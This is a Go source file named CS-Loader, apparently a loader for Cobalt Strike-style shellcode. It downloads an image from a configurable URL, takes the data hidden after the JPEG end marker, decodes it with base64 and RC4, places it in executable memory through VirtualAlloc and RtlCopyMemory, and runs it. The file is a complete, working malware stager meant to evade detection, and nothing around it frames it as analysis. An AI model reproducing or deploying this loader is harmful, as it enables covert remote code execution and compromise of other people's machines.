//Author: Gality
//Name：CS-Loader.go
//Usage:
//require: None
//Description: load shellcode from img
//E-mail: gality365@gmail.com
// fix by yumusb
package main

import (
	"io/ioutil"
	"net/http"
	"os"
	b64 "encoding/base64"
	"crypto/rc4"
	"syscall"
	"unsafe"
	"crypto/md5"
	"encoding/hex"
	"bytes"
	"fmt"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40 // 区域可以执行代码，应用程序可以读写该区域。
	KEY_1                  = 55
	KEY_2                  = 66
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)
func md5V(str string) string  {
    h := md5.New()
    h.Write([]byte(str))
    return hex.EncodeToString(h.Sum(nil))
}
func main()  {
	imageURL := "http://127.0.0.1:8000/shellcode_loader.jpg"
	rc4KeyPlain := "your-rc4Key"

	rc4Key := []byte(md5V(rc4KeyPlain))
	//插桩1
	fmt.Printf("ok 111.\n")
	resp, err := http.Get(imageURL)
	if err != nil {
		os.Exit(1)
	}
	b, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		os.Exit(1)
	}
	//直接以ffd9做split，得到shellcode
	c := bytes.Split(b,[]byte{255,217})
	//插桩2
	fmt.Printf("ok 222.\n")
	fmt.Printf("length of c: %v\n", len(c))

	if len(c) != 2 {
		os.Exit(1)
		//"error load img"
	}
	raw := string(c[1])
	/*-------------获取图片shellcode并进行算法解密s-------------*/
	fmt.Printf("%v\n", raw)
	sDec, _ := b64.StdEncoding.DecodeString(raw)
	cipher, _ := rc4.NewCipher(rc4Key)
	cipher.XORKeyStream(sDec, sDec)
	sDec = []byte(sDec)
	sDec, _ = b64.StdEncoding.DecodeString(string(sDec[:]))
	/*-------------获取图片shellcode并进行算法解密e-------------*/

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(sDec)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	fmt.Printf("%v\n", err)
	//判断 VirtualAlloc 调用是否成功，如果成功继续往下走，否则Exit(0)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	fmt.Printf("%v\n", err)
	//判断 RtlCopyMemory 调用是否成功，如果成功继续往下走，否则Exit(0)
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}
